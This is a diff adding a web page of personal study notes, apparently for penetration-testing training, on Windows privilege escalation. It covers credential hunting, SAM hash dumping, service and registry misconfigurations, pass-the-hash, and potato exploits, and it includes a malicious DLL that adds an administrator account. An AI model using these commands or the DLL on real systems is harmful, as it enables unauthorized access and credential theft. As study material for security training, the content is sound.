+    <span class="md-ellipsis">
+      
+        Named Pipes
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#getsystem" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Getsystem
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#abusing-user-privileges" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Abusing User privileges
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#uac-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        UAC Bypass
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<div><h1 id="windows-privilege-escalation">Windows Privilege Escalation</h1>
+<h2 id="privileges-and-access-control-mechanisms">Privileges and Access Control Mechanisms</h2>
+<h3 id="security-identifier">Security Identifier</h3>
+<p>SID is a unique value assigned to each entity, principal, that can be authenticated b WIndows, such as users and groups.
+The SID for local accounts is created by the <em>Local Security Authority</em>. For Domain accounts it is created by the <em>Domain Controller</em>
+SID contains differrent parts, delimited by the -. Format "S-R-X-Y"
+    S: Just an S, inidcating this is a string
+    R: Revision, always set to 1 since format is still the original structure
+    X: Determines the indentifier authourity. This is the issuer of the SID. Most common is 5 for NT Authority
+    Y: COnatins the sub domain identifiers and relative indentifiers. The last number is like UID on Linux
+    Example: S-1-5-21-1336799502-1441772794-948155058-1001
+User SIDs start at 1000, but there are built in accounts with SID lower than 1000. SOme that may be useful for priv esc:
+    S-1-0-0                       Nobody      <br>
+    S-1-1-0                       Everybody
+    S-1-5-11                      Authenticated Users
+    S-1-5-18                      Local System
+    S-1-5-domainidentifier-500    Administrator</p>
+<h3 id="access-tokens">Access Tokens</h3>
+<p>Once a User is authenticated Windows generates an access token assigned to that user. This token details all of their privileges.
+When a user starts a process or thread, a token willl be assigned to these objects
+A thread can also have an impersonation token designed to provide a different security context
+WIndows also implements 5 integrity levels. A process from a lower level cannot write to a process with a higher one:
+- System: SYSTEM (kernel, ...)
+- High: Elevated users
+- Medium: Standard users
+- Low: Very restricted rights often used in sandboxed[^privesc_win_sandbox] processes or for directories storing temporary data
+- Untrusted: Lowest integrity level with extremely limited access rights for processes or objects that pose the most potential risk</p>
+<h3 id="user-account-control">User Account Control</h3>
+<p>WIndows Security Feature that runs most apps as unprivileged users, even if on an admin account. A user access prompt must be confirmed to run applications as admin</p>
+<h3 id="enumerate-apps">Enumerate Apps</h3>
+<pre><code class="language-Powershell">Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+</code></pre>
+<p>Above command shows all 32 bit applications installed</p>
+<pre><code class="language-Powershell">Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+</code></pre>
+<p>Above command shows all 32 bit applications installed</p>
+<h3 id="hidden-in-plain-view">Hidden in Plain View</h3>
+<p>Be sure to check plain text files for valuable information. Text files, configuration files, onboarding docs, etc may contain passwords
+Once we identify what software is on the system, we can try to search for config files and databases that might have sensitive info
+We can use the Get-ChildItem cmdlet in PowerShell to do this</p>
+<pre><code class="language-Powershell">Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+</code></pre>
+<p>The above example searches for the password manager database</p>
+<pre><code class="language-Powershell">Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
+</code></pre>
+<p>The above example searches for both .txt and .ini files related to the xampp software
+We can also search for plaintext documents under a users home directory</p>
+<pre><code class="language-Powershell">Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
+</code></pre>
+<p>If we recover other users credentials we should test them. If they are successful, make sure to go back and repeat the "gathering sensitive info" steps because permissions change.</p>
+<p>==If we recover valid credentials we can use the Runas command to run programs as different users only if we have a GUI. 
+If th user has Log on as batch job access, we can schedule a task or program as them
+If the user has ActiveSession, we can use PsExec from Sysinternals==</p>
+<pre><code class="language-Powershell">runas /user:backupadmin cmd
+</code></pre>
+<p>Additioanlly to elevate to an admin command prompt we can use</p>
+<pre><code class="language-cmd">powershell -Command "Start-Process cmd -Verb RunAs"
+</code></pre>
+<p><code>set</code> --&gt; returns environment variables
+<code>tasklist /svc</code> --&gt; shows running tasks</p>
+<h4 id="dictionary-files">Dictionary Files</h4>
+<p>Another interesting case is dictionary files. For example, sensitive information such as passwords may be entered in an email client or a browser-based application, which underlines any words it doesn't recognize. The user may add these words to their dictionary to avoid the distracting red underline.</p>
+<pre><code class="language-powershell">gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
+</code></pre>
+<h4 id="sticky-notes">Sticky Notes</h4>
+<p>People often use the StickyNotes app on Windows workstations to save passwords and other information, not realizing it is a database file. This file is located at <code>C:\Users\&lt;user&gt;\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite</code> and is always worth searching for and examining.</p>
+<p>Exfil to kali to view or can view in powershell by running <code>strings</code> on the file or importing  the <a href="https://github.com/RamblingCookieMonster/PSSQLite">PSSQLite module</a>.</p>
+<h4 id="other-files-of-interest">Other files of interest</h4>
+<pre><code>%SYSTEMDRIVE%\pagefile.sys
+%WINDIR%\debug\NetSetup.log
+%WINDIR%\repair\sam
+%WINDIR%\repair\system
+%WINDIR%\repair\software, %WINDIR%\repair\security
+%WINDIR%\iis6.log
+%WINDIR%\system32\config\AppEvent.Evt
+%WINDIR%\system32\config\SecEvent.Evt
+%WINDIR%\system32\config\default.sav
+%WINDIR%\system32\config\security.sav
+%WINDIR%\system32\config\software.sav
+%WINDIR%\system32\config\system.sav
+%WINDIR%\system32\CCM\logs\*.log
+%USERPROFILE%\ntuser.dat
+%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
+%WINDIR%\System32\drivers\etc\hosts
+C:\ProgramData\Configs\*
+C:\Program Files\Windows PowerShell\*
+</code></pre>
+<p>When all else fails, we can run the <a href="https://github.com/AlessandroZ/LaZagne">LaZagne</a> tool in an attempt to retrieve credentials from a wide variety of software.</p>
+<p>We can use <a href="https://github.com/Arvanaghi/SessionGopher">SessionGopher</a> to extract saved PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP credentials. The tool is written in PowerShell and searches for and decrypts saved login information for remote access tools.</p>
+<h4 id="clipboard">CLipboard</h4>
+<p>We can use the <a href="https://github.com/inguardians/Invoke-Clipboard/blob/master/Invoke-Clipboard.ps1">Invoke-Clipboard</a> script to extract user clipboard data. Start the logger by issuing the command below.</p>
+<h3 id="inspecting-powershell-logs">Inspecting Powershell Logs</h3>
+<p>In an enterprise setting we can see if Powershell logging is enabled. Two important mechanisms are Powershell Transcription and Powershell Script Block
+Transcript files log everything a user types and are usually saved in the home directories of users, once central directory, or one central network share.
+Script Block logging records commands and blocks of scriptcode while executing. This results in logging the full context of code execution. --&gt; <em>We can search through this log in event viewer if it is enabled</em>. Logs are located under Application and service logs --&gt; Microsoft --&gt; Windows --&gt; Powershell --&gt; Operational. Task category execute remote command was helpful for the exercise
+We can also use the <code>Get-History</code> cmdlet in PowerShell to obtain a list of past commands
+Note: the Clear-History cmdlet the admins use only clears the history that the Get-History cmdlet retrieves. We can use the PSReadline module to potentially locate a history file that is unaffected</p>
+<pre><code class="language-Powershell">(Get-PSReadlineOption).HistorySavePath
+</code></pre>
+<p>The above command will print the file path to the console history file. The syntax with parenthesis allows use to select the one desired option for the module
+We can check the history file for commands containing sensitive data</p>
+<p>If credentials are recovered and we try to pivot accounts, We should note that creating a PowerShell remoting session via WinRM in a bind shell can cause unexpected behavior. --&gt; we can use evil-winrm from our kali machine to pivot instead.
+    evil-winrm provides various functions, such as, pass the hash, in memory loading, file upload/download.</p>
+<pre><code class="language-Powershell">evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
+</code></pre>
+<p>Note we have to escape special characters with "\" since we are in linux</p>
+<h2 id="inspecting-procceses">Inspecting procceses</h2>
+<p>the following script will catch proccesses being passed through CMD --&gt; we can look for creds being passed</p>
+<pre><code class="language-shell-session">while($true)
+{
+
+  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
+  Start-Sleep 1
+  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
+  Compare-Object -ReferenceObject $process -DifferenceObject $process2
+
+}
+</code></pre>
+<h4 id="powershell-saved-credentials">Powershell saved credentials</h4>
+<p>PowerShell credentials are often used for scripting and automation tasks as a way to store encrypted credentials conveniently. The credentials are protected using <a href="https://en.wikipedia.org/wiki/Data_Protection_API">DPAPI</a>, which typically means they can only be decrypted by the same user on the same computer they were created on.</p>
+<p>Take, for example, the following script <code>Connect-VC.ps1</code>, which a sysadmin has created to connect to a vCenter server easily.</p>
+<p>Code: powershell</p>
+<pre><code class="language-powershell"># Connect-VC.ps1
+# Get-Credential | Export-Clixml -Path 'C:\scripts\pass.xml'
+$encryptedPassword = Import-Clixml -Path 'C:\scripts\pass.xml'
+$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
+Connect-VIServer -Server 'VC-01' -User 'bob_adm' -Password $decryptedPassword
+</code></pre>
+<p>If we have gained command execution in the context of this user or can abuse DPAPI, then we can recover the cleartext credentials from <code>encrypted.xml</code>. The example below assumes the former.</p>
+<p>Credential Hunting</p>
+<pre><code class="language-powershell-session">PS C:\htb&gt; $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
+PS C:\htb&gt; $credential.GetNetworkCredential().username
+
+bob
+
+
+PS C:\htb&gt; $credential.GetNetworkCredential().password
+
+Str0ng3ncryptedP@ss!
+</code></pre>
+<h3 id="automating-enumeration">Automating Enumeration</h3>
+<p>https://github.com/carlospolop/PEASS-ng/releases/latest
+WinPEAS :)
+also SeatBelt
+don't forget to do manual enumeration too</p>
+<p>"C:\Windows\Temp is usually world writeable. Try pulling files into there"</p>
+<p>Pay attention  to services we can restart</p>
+<p>check privileges
+    can abuse SeDebugPrivilege, SeImpersoantePrivilege
+        SeImpersonate allows a user to impersonate other tokens such as Admin tokens</p>
+<p>MOVING FILES ONTO REMOTE TARGET
+    -Host simple http server and pull in from rhost
+        on lhost: 
+    - Can try to use upload feature of services running on host</p>
+<p>Check for services that have open file permissions</p>
+<h2 id="kernel-exploits">Kernel Exploits</h2>
+<p>enumerate windows version and patches
+FInd matching exploits
+compile and run
+use as last resort
+Windows exploit suggester takes output of sysinfo commnand to find exploits
+Precompiled Kernel exploits at SecWiki/windows-kernel-exploits github
+Watson another tool option
+==HTB Academy has a great table==</p>
+<h2 id="service-exploits">Service exploits</h2>
+<p>Services that run with system privilege and are misconfigured are exploitable
+some useful commands for running services
+    query the config of a service:
+        sc.exe qc name
+    Query the current status of a service
+        sc.exe query name
+    Modify a config option of a service
+        sc.exe config name \&lt;option&gt;= \&lt;value&gt;
+    Start/stop a service
+        net start/stop \&lt;name&gt;
+To see all services running
+services.msc in the GUI</p>
+<pre><code class="language-PowerShell">Get-Service
+or
+Get-CimInstance
+</code></pre>
+<p><strong>When using a network logon such as WinRM or a bind shell, Get-CimInstance and Get-Service will result in a "permission denied" error when querying for services with a non-administrative user. Using an interactive logon such as RDP solves this problem.</strong></p>
+<pre><code class="language-Powershell">Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+</code></pre>
+<p>or we can use the example below to see all services</p>
+<pre><code class="language-Powershell">Get-CimInstance -ClassName win32_service | Select Name,State,PathName 
+</code></pre>
+<p>If we see services installed not in Windows/system32 directory they are likely user installed and more likely to be insecure
+<strong>We can use icacls to see the file permissions</strong>
+    |MASK|PERMISSIONS|
+    |Mask| Permision|
+    |F|  Full access|
+    |M|  Modify access|
+    |RX| Read and execute access|
+    |R|   Read-only access|
+    |W|  Write-only access|</p>
+<pre><code>icacls 
+</code></pre>
+<h3 id="insecure-service-properties">Insecure Service properties</h3>
+<p>Each service has ACLs that define service permission
+Dangerous ones include:
+- SERVICE_CHANGE_CONFIG - changes config of service
+- SERVICE_ALL_ACCESS - have full control over service
+If user has permission to change service config we can point it towards our reverse shell executable.
+    Potential rabbit hole: If we cannot start and stop the service we may not be able to escalate privileges
+Vulnerable services seen under the "modifiable services" section in WINPEAS
+We can query the config of a service to see info about when it starts, executable to run, etc
+Easiest way to exploit this is to set the binary path to the reverse shell</p>
+<p>we can cross compile exploits for windows using the command:</p>
+<pre><code class="language-bash">x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+</code></pre>
+<p>Powerup.PS1 can also help identify services</p>
+<h3 id="unquoted-service-path">Unquoted Service Path</h3>
+<p>Executables in windows can be run without their extension
+If there are spaces in an unquoted service path it is ambiguous to windows
+It will check all options to see what is executable --&gt; if we can put an executable into one of these places we can trick windows into running it
+see the "unquoted service" output of WINPEAS for this
+- check if we have access to start the "unqoutedsvc" service
+- then check if we can write to any of the directories in the path of the unquotedsvc file
+- Put reverse executable shell in path and start service
+For example if we called <code>C:\Program Files\My Program\My Service\service.exe</code> without quotes, Windows would do the following checks:</p>
+<pre><code>C:\Program.exe
+C:\Program Files\My.exe
+C:\Program Files\My Program\My.exe
+C:\Program Files\My Program\My service\service.exe
+</code></pre>
+<p>In the context of the example, we could name our executable <strong>Program.exe</strong> and place it in C:\, <strong>My.exe</strong> and place it in C:\Program Files\, or <strong>My.exe</strong> and place it in C:\Program Files\My Program\. However, the first two options would require some unlikely permissions since standard users don't have the permissions to write to these directories by default.</p>
+<p>We can use the command below to observe service paths with spaces</p>
+<pre><code class="language-cmd">wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
+</code></pre>
+<p>Once a potential Service is found, ==Make sure we can start and stop the service and check permission on the potential folder==
+<code>icacls &lt;folder&gt;</code> can be used to check permission</p>
+<h3 id="weak-registry-permissions">Weak registry Permissions</h3>
+<p>If ACLS are misconfigured it may be possible to modify a service's configuration even if we can't modify the service directly
+NT Authority\Interactive is the group of all users who can log in locally to the system. We can check privilege on this group looking for KEY_ALL_ACCESS --&gt; this will allow us to overwrite the registry key. Want t overwrite the image path value for the regsvc service
+This has the same effect of changing the bin path of the service</p>
+<h3 id="insecure-service-executables">Insecure Service Executables</h3>
+<p>if the original service is modifiable by the user we can simply replace it with our reverse shell
+These will be executables that are writeable by everyone
+make sure we back up original service
+simply overwrite service with reverse shell executable and run service</p>
+<h3 id="dll-hijacking">DLL Hijacking</h3>
+<p>executables try to run functionality from DLL
+if a DLL is loaded from an absolute path, it might be possible to escalate privileges if that DLL is writable by our user
+More commonly if a DLL is missing and our user has write access to DLL paths we can put malicious code there
+process is very manual
+- look for non microsoft services
+- see what we have start and stop permission for
+- see what executable the service runs
+- copy .exe file off the machine to a windwos host you have admin priv on
+- run process monitor to analyze
+- stop and clear current process
+- CTRL+L to set a new filter --&gt; filter on copied over service --&gt; proocess name filter
+-  deselect show registry activity and show network activity and start againa
+- in cmd prompt start the service
+- in procmon we can see where windows is looking for DLL files --&gt; identify if there are writable directories on target machine
+- Place reverse shell executable in identified directory --&gt; make sure to match the name of the .dll file the service is looking for
+Standard DLL Loading order:</p>
+<pre><code>1. The directory from which the application loaded.
+2. The system directory.
+3. The 16-bit system directory.
+4. The Windows directory. 
+5. The current directory.
+6. The directories that are listed in the PATH environment variable.
+</code></pre>
+<p>We do need to copy the binary to a local machine and use Process Monitor aka Procmon to identify which DLLs are being loaded --&gt; no being lazy with this one
+ProcMon give a lot of info. We are going to want to filter on a  serivce's name--&gt; Proccess Name, is, "name", include --&gt; filter
+Note: name is the executable name, not the service name assigned using SC create
+Once the filter is in place we want to restart the service. We can use net start/stop or <code>Restart-Service &lt;name&gt;</code> in PowerShell
+We want to browse the CreateFile function logs --&gt; this is the function that creates or opens files
+If we see a DLL not loaded we can simply write a DLL file with the called name to a path used by the program for DLLs
+install the service using:</p>
+<pre><code class="language-cmd">SC CREATE "svc_name" bin ="Path to executable"
+</code></pre>
+<h4 id="writing-malicious-dll">Writing Malicious DLL</h4>
+<p>Below is the default code/structure for DLLs. There are for main cases for dll use. We are concerned with DLL_Process attach because that is the case when a service is loading a dll. Also note, no code will execute unless the DllMain function is specified</p>
+<pre><code class="language-C++">BOOL APIENTRY DllMain(
+HANDLE hModule,// Handle to DLL module
+DWORD ul_reason_for_call,// Reason for calling function
+LPVOID lpReserved ) // Reserved
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+        break;
+        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+        break;
+        case DLL_THREAD_DETACH: // A thread exits normally.
+        break;
+        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+        break;
+    }
+    return TRUE;
+}
+</code></pre>
+<p>Taking the above format we can  add our malicious code in the dll process attach case. We also add some standard c++ headers</p>
+<pre><code class="language-C++">#include &lt;stdlib.h&gt;
+#include &lt;windows.h&gt;
+
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Handle to DLL module
+DWORD ul_reason_for_call,// Reason for calling function
+LPVOID lpReserved ) // Reserved
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+        int i;
+        i = system ("net user dave2 password123! /add");
+        i = system ("net localgroup administrators dave2 /add");
+        break;
+        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+        break;
+        case DLL_THREAD_DETACH: // A thread exits normally.
+        break;
+        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+        break;
+    }
+    return TRUE;
+}
+</code></pre>
+<p>we can cross-compile thos code on kali using the mingw32-gcc</p>
+<pre><code class="language-bash">x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
+</code></pre>
+<p>Note: we need the --shared flag for  dll
+Now all we need to do is place the dll within the path and execute the serivce
+cd </p>
+<h3 id="disable-safe-load-mode">disable safe load mode</h3>
+<p>The default DLL search order used by the system depends on whether <code>Safe DLL Search Mode</code> is activated. When enabled (which is the default setting), Safe DLL Search Mode repositions the user's current directory further down in the search order. It’s easy to either enable or disable the setting by editing the registry.</p>
+<ol>
+<li>Press <code>Windows key + R</code> to open the Run dialog box.</li>
+<li>Type in <code>Regedit</code> and press <code>Enter</code>. This will open the Registry Editor.</li>
+<li>Navigate to <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager</code>.</li>
+<li>In the right pane, look for the <code>SafeDllSearchMode</code> value. If it does not exist, right-click the blank space of the folder or right-click the <code>Session Manager</code> folder, select <code>New</code> and then <code>DWORD (32-bit) Value</code>. Name this new value as <code>SafeDllSearchMode</code>.</li>
+<li>Double-click <code>SafeDllSearchMode</code>. In the Value data field, enter <code>1</code> to enable and <code>0</code> to disable Safe DLL Search Mode.</li>
+<li>Click <code>OK</code>, close the Registry Editor and Reboot the system for the changes to take effect.</li>
+</ol>
+<p>With this mode enabled, applications search for necessary DLL files in the following sequence:</p>
+<ol>
+<li>The directory from which the application is loaded.</li>
+<li>The system directory.</li>
+<li>The 16-bit system directory.</li>
+<li>The Windows directory.</li>
+<li>The current directory.</li>
+<li>The directories that are listed in the PATH environment variable.</li>
+</ol>
+<p>However, if 'Safe DLL Search Mode' is deactivated, the search order changes to:</p>
+<ol>
+<li>The directory from which the application is loaded.</li>
+<li>The current directory.</li>
+<li>The system directory.</li>
+<li>The 16-bit system directory.</li>
+<li>The Windows directory</li>
+<li>The directories that are listed in the PATH environment variable</li>
+</ol>
+<h2 id="registry-exploits">Registry exploits</h2>
+<h3 id="auto-run">Auto run</h3>
+<p>Autoruns are configured with registries.
+If you are able to write an Autorun executable and are able to restart the system you may be able to escalate privilege
+check if we can write to any autorun application
+we can query the registry Current Version\Run to see all autorun programs
+we can then check if files are writable
+find writable program\directory --&gt; just need to overwrite file and restart computer
+might need to have admin logged in last for this to work</p>
+<h3 id="msi-files">MSI files</h3>
+<p>msi files can run as admin, but can be executed by the user --&gt; if we can generate malicious msi file we can get  elevate privileges
+==need AlwaysInstalledElevated registry set in two spots for this to work==
+- HKLM\SOFTWARE\Policies\Microsft\Windows\Installer --&gt; allows MSI files to run on system
+- HKCU\Software\Policies\Microsoft\windows\Installer --&gt; allows user to run msi files
+Just need to copy over malicious msi file and execute it</p>
+<h2 id="passwords">Passwords</h2>
+<p>Check system for passowrds in readable locations
+check windows registry for plaintext passwords
+Following commands will search registries for keys and values that contain the plaintext "password"
+- reg query HKLM /f password /t REG_SZ /s --&gt; queires local machine entires
+- reg query HKCU /f password /t REG_SZ /s --&gt; queries current user entries
+These will generate a lot of results
+WINPEAS will also output any plaintext or autologon creds it finds in registries
+if any account creds are found we can use the winexe command to spawn a shell</p>
+<pre><code class="language-cmd">winexe -U 'user%password' //&lt;ip&gt; cmd.exe
+</code></pre>
+<p>can use this with --system option to spawn system shell</p>
+<h3 id="saved-creds">saved creds</h3>
+<p>windows allows users to save creds to the system to be used with runas
+cmdkey /list --&gt; will show saved credentials for the current user</p>
+<pre><code class="language-cmd">runas /savedcred /user:admin &lt;path to malicious exe&gt;
+</code></pre>
+<h3 id="config-files">config files</h3>
+<p>look for config files with plaintext creds --&gt; Unattend.xml is an example
+useful commands:
+- dir /s *pass* == *.config --&gt; searches for files in current directory with pass in name for .config
+- findstr /si password *.xml *.ini *.txt --&gt; recursively search for files in the current directory that contain "password" and end in those extensions
+WINPEAS has a check for "known files that may contain credentials"
+NOTE: Passwords may be base 64 encoded</p>
+<h3 id="sam">SAM</h3>
+<p>windows stores password hashes in the Security account administrator (SAM)
+Key to decrypt hashes can be found in a file named SYSTEM
+FILES are located at: C:\WIndows\System32\config direotry
+Backups may exist in C:\WIndows\Repair or C:\WIndows\SYstem32\config\regback directory
+if files are found copy them back to Kali
+make sure we have latest version of <strong>pwdump</strong> too as part of the cred-dump7 suite or similar
+first part is LM hash, second part is NTLM hash
+    hashes that start with 381c are either empty password or account is disables
+==Something about SAM can be recovered with "reg" command. Need to investigate use and rperequisites==
+I think being a service accoutn is a sufficent pre req
+SAM hashes can also be recovered using the commands </p>
+<pre><code class="language-cmd">reg save hklm\system system
+reg save hklm\sam sam
+</code></pre>
+<p>~~Then on kali we use the tool samdump2 to get the decrypted hashes~~ <strong>Note this command gave blank hashes. Use pypykatz first</strong></p>
+<pre><code>root@~/tools/mitre/pwdump# samdump2 system sam 
+</code></pre>
+<p>pypykatz command to use:</p>
+<pre><code class="language-bash">pypykatz registry --sam sam system
+</code></pre>
+<h3 id="pass-the-hash">Pass the hash</h3>
+<p>windows accepts hahses to a number of services
+we can pass the hash to open a new terminal</p>
+<pre><code class="language-cmd">pth-winexe -U 'user%LM:NTLM' //&lt;ip&gt; cmd.exe
+</code></pre>
+<p>note: we need to supply both LM and NTLM hashes in the password field
+==Refer to Password Attacks for more info on cracking and passing NTLM==
+potentially useful tools:
+impacket-psexec
+impacket-wmiexec
+pth-*</p>
+<h2 id="scheduled-tasks">Scheduled Tasks</h2>
+<pre><code class="language-cmd">schtasks /query /fo LIST /v
+</code></pre>
+<pre><code class="language-PS">Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
+</code></pre>
+<p>Above commands will query all scheduled tasks visible to user
+often times we need to finds scripts or logs to hint at tasks being run
+manually enumerate interesting drives
+use access check to see permissions for script files
+if  we can edit file simply add code to call out to our machine and set up listener
+There are three main details we are concerned about with reconning tasks for priv esc"
+- which user account (principal) does the task execute as?
+    - we want NT Authority\System or an admin user
+- what triggers are specified for the task
+    - If the task is triggered it will not run again
+- what actions are executed when the triggers are met
+    - Depenending ont he action we can use other tactics discussed in these notes</p>
+<h2 id="gui-apps">GUI Apps</h2>
+<p>Some versions of windows, users could be granted the permission to run certain GUI apps with admin priv
+any child methods spawned will still be system level
+open an admin gui app</p>
+<pre><code class="language-cmd">tasklist /V | finsstr &lt;exe file for app&gt;
+</code></pre>
+<p>in app
+- file --&gt; open
+- in nav bar: "file//c:/windows/system32/cmd.exe
+this should spawn command prompt</p>
+<h2 id="startup-apps">Startup Apps</h2>
+<p>users can define apps that start when they login
+C:\ProgramData\Microsoft\Windows\Start Menu\Progams\StartUp --&gt; dir where programs start for all users.
+If we can write a exe to this directory we can get a reverse shell upon admin login</p>
+<h2 id="installed-apps">installed apps</h2>
+<p>we can use exploit db web interface and filter on apps that have privesc
+Most of these exploits will rely on the same permissions covered above
+buffer overflow exploits will add value here
+tasklist command will show all running processes
+WINPEAS process info option can callout non standard process
+checkthese against exploitdb</p>
+<h2 id="hot-potato">Hot Potato</h2>
+<p>Spoofing attack along with NTLM relay attack that tricks system into authenticating to http server
+Only works on win 7,8, and early 10
+need compiled exploit</p>
+<pre><code class="language-cmd">.\potato.exe -ip &lt;ip&gt; -cmd &lt;path to malicious exe&gt; -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
+</code></pre>
+<h2 id="token-impersonation">Token Impersonation</h2>
+<p>SeImpersonatePrivilege
+SEAssign primary token --&gt; these two user tokens allow an account to impersonate the access tokens of other users.
+these are usually enabled on Service accounts</p>
+<h3 id="rotten-potato">Rotten Potato</h3>
+<p>limited exploit</p>
+<h3 id="juicy-potato">Juicy Potato</h3>
+<p>similar to rotten potato but better --&gt; patched in win10 now
+run from service account
+port 1337 must be available and the CLSID must be valid
+can get reverse shells of service accounts by compromising services</p>
+<h3 id="rogue-potato">Rogue Potato</h3>
+<p>Latest of the potatoes
+github/antonioCoco/RougePotato</p>
+<h3 id="printspoofer">Printspoofer</h3>
+<p>exploit that targets print spooler service
+github/itm4n/PrintSpoofer
+need redistributable C++ </p>
+<h2 id="port-forwarding">Port Forwarding</h2>
+<p>Sometimes it is easier to run exploit code on kali, but the vulnerable program is listening on an internal port.
+In these cases we need to forward a port on kali to the internal port on windows
+we can do this using a program called plink.exe
+can run plink on windows
+kill SMB server running on kali because we need to forward that port
+Also need ssh service in kali to allow root login with password
+ssh service restart
+run .\plink.exe root@ip -R 445:127.0.0.1:445
+This will forward the kali smb port to the windows internal port
+Back on regular kali machine we modify the desired command to point to local port we forwarded. this will reach the windows port</p>
+<h2 id="strategy">Strategy</h2>
+<ul>
+<li>Check user and groups</li>
+<li>Run WINPEAS with fast, searchfast and cmd options</li>
+<li>Run Seatbelt &amp; Other scripts as well</li>
+<li>If all else fails run manual commands</li>
+</ul>
+<p>Be patient and read over all results of enumeration --&gt; for each finding create a checklist of everything you need to work
+Have a quick look around for files on user desktop and other common locations
+try things that don't have many steps first
+have a good look at admin processes and enumerate versions --&gt; search for exploits
+check internal ports we can forward to as well
+If we still don't have shell re read dumps and highlight anything that seems odd</p>
+<h2 id="named-pipes">Named Pipes</h2>
+<h2 id="getsystem">Getsystem</h2>
+<p>Processes are able to create named pipes so other processes can read/write from it
+process which creates the named pipe can impersonate the security context of the process that connects to the named pipe
+getsystem is the metasploit command that exploits this automatically</p>
+<h2 id="abusing-user-privileges">Abusing User privileges</h2>
+<p>github/hatRiot/Tokenptiv is a good resource to learn about these
+whoami /priv --&gt; list privileges, you have everything listed</p>
+<p>SeImpersonatePrivilege
+    grants ability to impersonate any access tokens which it can obtain
+    if an access token from system process can be obtained, a new process can be spawned using that token
+SeAssignPrimary Privilege
+Similar to impersonate
+SeBackupPrivilege
+provides read access to all objects on the system --&gt; Can gain access to sensitive files or extract hashes on the registry
+SeRestorePrivilege --&gt; write access to everyhtin on the system --&gt; can modify service binary overwrite DLLs used by the system, modify registry settings
+SeTakeOwnership --&gt; let's user take write ownership of object --&gt; can change ACL
+Other
+    SeTcbPrivielge
+    SeCreateTokenPrivilege
+    seLoadDriverPrivilege
+    SeDebugPrivilege</p>
+<p>To abuse access to SeImpersonatePrivilege we need to coerce a privileged process into connecting to us via a controlled named pipe. <strong>We can use Printspoofer or the potato tools listed above under token impersonation to execute this type of attack</strong></p>
+<p>We will see ways to abuse various privileges throughout this module and various ways to enable specific privileges within our current process. One example is this PowerShell <a href="https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts%5CEnable-Privilege.ps1">script</a> which can be used to enable certain privileges, or this <a href="https://www.leeholmes.com/adjusting-token-privileges-in-powershell/">script</a> which can be used to adjust token privileges.</p>
+<p>Backup operators
+As the <code>NTDS.dit</code> file is locked by default, we can use the Windows <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow">diskshadow</a> utility to create a shadow copy of the <code>C</code> drive and expose it as <code>E</code> drive. The NTDS.dit in this shadow copy won't be in use by the system.</p>
+<pre><code> diskshadow.exe
+</code></pre>
+<pre><code>dir E:\
+</code></pre>
+<p>Next, we can use the <code>Copy-FileSeBackupPrivilege</code> cmdlet to bypass the ACL and copy the NTDS.dit locally.</p>
+<p>Event log readers
+we can search windows logs for credentials</p>
+<pre><code class="language-powershell">wevtutil qe Security /rd:true /f:text | Select-String "/user"
+</code></pre>
+<p>Above commands look for user flag specified --&gt; often password is also passed cmd line</p>
+<p>For <code>Get-WinEvent</code>, the syntax is as follows. In this example, we filter for process creation events (4688), which contain <code>/user</code> in the process command line.</p>
+<p>Note: Searching the <code>Security</code> event log with <code>Get-WInEvent</code> requires administrator access or permissions adjusted on the registry key <code>HKLM\System\CurrentControlSet\Services\Eventlog\Security</code>. Membership in just the <code>Event Log Readers</code> group is not sufficient.</p>
